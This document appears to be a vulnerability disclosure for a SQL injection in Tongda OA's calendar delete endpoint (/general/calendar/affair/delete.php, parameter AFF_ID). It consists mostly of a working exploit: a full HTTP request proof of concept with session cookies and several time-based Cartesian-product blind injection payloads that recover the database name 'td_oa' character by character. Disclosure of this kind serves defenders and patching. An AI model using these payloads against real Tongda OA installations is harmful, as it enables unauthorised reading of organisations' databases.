SQL injection vulnerability exists in Tongda OA

version:v2017 version and versions below v11.10

route:/general/calendar/affair/delete.php

There is an injected parameter: $AFF_ID

The code here is very concise. When $AFF_ID is not empty, the parameters are directly spliced ​​into the SQL statement. Since the parentheses are closed here, there is a bypass.

![image](https://github.com/cqliuke/cve/assets/123135436/ecef143e-a3b1-4947-b30b-39282afd0f58)
POC
```
GET /general/calendar/affair/delete.php?AFF_ID=1)%20and%20(substr(DATABASE(),1,1))=char(116)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1 HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: USER_NAME_COOKIE=admin; SID_1=7d65bff3; OA_USER_ID=admin; PHPSESSID=ufv7doqhvbv7qsjjqlot2bv420
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
```
2.Payload
We can use Cartesian product blind injection for injection. The following payload can determine that the first character of the database name is t, because it was successfully delayed at 116. The ASCII code 116 also corresponds to the lowercase letter t. By analogy, the database name and any information about the database can be obtained through blind injection.

```
1)%20and%20(substr(DATABASE(),1,1))=char(116)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1
```
![image](https://github.com/cqliuke/cve/assets/123135436/ea8f2557-0517-4d64-abfd-c21403130241)

Intercept the second digit of the database through blind injection, and determine the second digit as the letter d through the delay time

```
1)%20and%20(substr(DATABASE(),2,1))=char(100)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1
```
![image](https://github.com/cqliuke/cve/assets/123135436/8eab89d6-ca72-4766-bb7d-a4c2a0d7f110)

The third digit is the character _

```
1)%20and%20(substr(DATABASE(),3,1))=char(95)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1
```

![image](https://github.com/cqliuke/cve/assets/123135436/cd6abe0e-e25b-4435-a8bb-c1c8103dc1b2)

The fourth digit is the character o

```
1)%20and%20(substr(DATABASE(),4,1))=char(111)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1
```
![image](https://github.com/cqliuke/cve/assets/123135436/d2c76053-adfe-46b5-8e06-e47ed3820675)

The fifth digit is the character a

```
1)%20and%20(substr(DATABASE(),5,1))=char(97)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1
```
![image](https://github.com/cqliuke/cve/assets/123135436/fb23e2f2-9e0a-4d60-a19e-0e28770ac5ab)

Then through blind injection, you can determine that the database name is: td_oa




